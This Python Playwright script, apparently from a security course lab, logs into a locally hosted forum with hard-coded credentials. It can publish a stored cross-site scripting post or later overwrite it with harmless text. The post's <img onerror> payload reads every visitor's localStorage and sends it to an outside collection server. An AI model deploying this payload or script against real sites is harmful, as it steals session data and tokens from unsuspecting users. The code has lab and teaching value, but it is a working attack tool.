from playwright.sync_api import sync_playwright

# Configuration
DEFAULT_USERNAME = "tr1"
DEFAULT_PASSWORD = "12345678"

NORMAL_PAYLOAD = "I looked up at the sky tonight and counted 812 stars."
ATTACK_PAYLOAD_IDENTIFIER = "counted 812.13 stars."
ATTACK_PAYLOAD = \
    f"I looked up at the sky tonight and {ATTACK_PAYLOAD_IDENTIFIER}" + \
    """<img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">"""


def login_page(page, username: str, password: str):
    print(f"Logging in as {username}...")

    page.goto("http://localhost:5173/")
    page.fill("#username", username)
    page.fill("#password", password)
    page.click("button:has-text('Sign In')")
    page.wait_for_url("**/forum")

    print("Successfully logged in!")


def enable_attack(page):
    print("Checking for existing attack posts...")

    content = page.content()
    if ATTACK_PAYLOAD_IDENTIFIER in content:
        print("XSS attack already present. No action taken.")
        return

    print("No existing attack found. Creating attack post...")
    page.fill("textarea#content", ATTACK_PAYLOAD)
    page.click("button:has-text('Publish Post')")

    # Wait until our timestamp appears
    page.wait_for_selector(f"text={ATTACK_PAYLOAD_IDENTIFIER}")
    print("Attack post created.")


def disable_attack(page):
    print("Checking for attack posts to sanitize...")

    content = page.content()
    if ATTACK_PAYLOAD_IDENTIFIER not in content:
        print("No XSS attack posts found. No action taken.")
        return

    print("Attack posts detected. Modifying posts...")
    posts = page.query_selector_all(".thread-card")
    for post in posts:
        html = post.inner_html()
        if ATTACK_PAYLOAD_IDENTIFIER in html:
            try:
                # find and click edit
                edit_btn = post.query_selector(".edit-button")
                if not edit_btn:
                    continue

                edit_btn.click()
                page.wait_for_selector(".edit-badge", timeout=5000)
                page.fill("textarea#content", NORMAL_PAYLOAD)
                page.click("button:has-text('Update Post')")

                # give server a moment
                page.wait_for_timeout(5000)
            except Exception as e:
                print(f"Error modifying post: {e}")


def logout_and_close(page, browser):
    try:
        page.click("button:has-text('Logout')")
        page.wait_for_url("**/")
        print("Logged out.")
    except Exception as e:
        print(f"Error during logout: {e}")

    browser.close()


if __name__ == "__main__":
    action = "1"

    with sync_playwright() as p:
        pw_browser = p.chromium.launch(headless=False)
        pw_context = pw_browser.new_context()
        pw_page = pw_context.new_page()

        login_page(pw_page, DEFAULT_USERNAME, DEFAULT_PASSWORD)

        pw_page.wait_for_timeout(2000)

        if action == "enable":
            enable_attack(pw_page)
        else:
            disable_attack(pw_page)

        logout_and_close(pw_page, pw_browser)
